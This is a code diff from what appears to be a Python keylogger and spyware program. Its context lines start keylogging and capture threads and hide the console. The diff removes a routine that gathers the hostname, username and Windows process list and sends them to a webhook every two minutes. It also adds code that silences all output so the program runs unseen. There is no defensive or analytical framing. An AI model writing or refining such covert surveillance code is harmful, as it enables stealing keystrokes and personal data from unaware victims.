@@ -387,28 +387,13 @@ def capture_loop():
             pass
         time.sleep(30)
 
-def system_monitor():
-    while running:
-        try:
-            info = {
-                "timestamp": datetime.now(timezone.utc).isoformat(),
-                "computer_name": socket.gethostname(),
-                "username": getpass.getuser(),
-                "processes": []
-            }
-            try:
-                if platform.system() == "Windows":
-                    output = subprocess.check_output(["tasklist", "/FO", "CSV", "/V"], stderr=subprocess.DEVNULL).decode()
-                    info["processes"] = output[:2000]
-            except:
-                pass
-            send_to_webhook(info, f"status_{int(time.time())}")
-        except:
-            pass
-        time.sleep(120)
-
 def main():
+    # Hide console immediately
     hide_console()
+    
+    # Suppress all output
+    sys.stdout = open(os.devnull, 'w')
+    sys.stderr = open(os.devnull, 'w')
     
     try:
         send_initial_report()
@@ -417,7 +402,6 @@ def main():
     
     threading.Thread(target=keylog_loop, daemon=True).start()
     threading.Thread(target=capture_loop, daemon=True).start()
-    threading.Thread(target=system_monitor, daemon=True).start()
     
     while running:
         time.sleep(1)
